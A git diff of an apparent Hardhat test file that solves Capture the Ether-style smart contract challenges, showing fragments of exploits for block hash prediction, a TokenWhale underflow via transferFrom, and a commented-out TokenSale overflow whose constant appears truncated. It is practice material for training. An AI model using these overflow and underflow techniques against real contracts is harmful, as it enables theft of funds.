@@ -142,7 +142,7 @@ describe("Tests", function () {
         await attack.guess(guessN, { gasLimit: 50000 });
       }
 
-      expect(await ptf.isComplete()).to.not.equal(true);
+      expect(await ptf.isComplete()).to.equal(true);
     });
   });
 
@@ -160,7 +160,7 @@ describe("Tests", function () {
         value: ethers.utils.parseEther("1"),
       });
 
-      await mine(258, 1);
+      await mine(257, 1);
 
       await ptbh.settle();
 
@@ -195,7 +195,7 @@ describe("Tests", function () {
   });
 
   describe("TokenWhale", () => {
-    it("Tricks the contract to underflow", async () => {
+    it.only("Tricks the contract to underflow", async () => {
       const [mainAcc, altAcc] = await ethers.getSigners();
 
       const TW = await ethers.getContractFactory("TokenWhaleChallenge");
@@ -208,26 +208,33 @@ describe("Tests", function () {
 
       await tw.transferFrom(altAcc.address, altAcc.address, 500);
 
-      expect(await tw.isComplete()).to.equal(true);
+      console.log(await tw.balanceOf(mainAcc.address));
+      console.log(await tw.balanceOf(altAcc.address));
+
+      expect(await tw.connect(altAcc).isComplete()).to.equal(true);
     });
   });
 
-  describe("TokenBank", () => {
-    it("Gets more tokens than it should", async () => {
-      const TS = await ethers.getContractFactory("TokenSaleChallenge");
+  //FIX TOKEN BANK AND PREDICT THE FUTURE
 
-      const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
+  // describe("TokenSale", () => {
+  //   it("Gets more tokens than it should", async () => {
+  //     const maxIntAnd1 =
+  //       "115792089237316195423570985008687907853269984665640564039459";
+  //     const TS = await ethers.getContractFactory("TokenSaleChallenge");
 
-      await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });
+  //     const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
 
-      await ts.sell(1);
+  //     await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });
 
-      expect(await ts.isComplete()).to.equal(true);
-    });
-  });
+  //     await ts.sell(1);
+
+  //     expect(await ts.isComplete()).to.equal(true);
+  //   });
+  // });
 
   describe("TokenBankChallenge", () => {
-    it.only("Solves the challenge", async () => {
+    it("Solves the challenge", async () => {
       const [_owner, attacker] = await ethers.getSigners();
       const challengeFactory = await ethers.getContractFactory(
         "TokenBankChallenge"
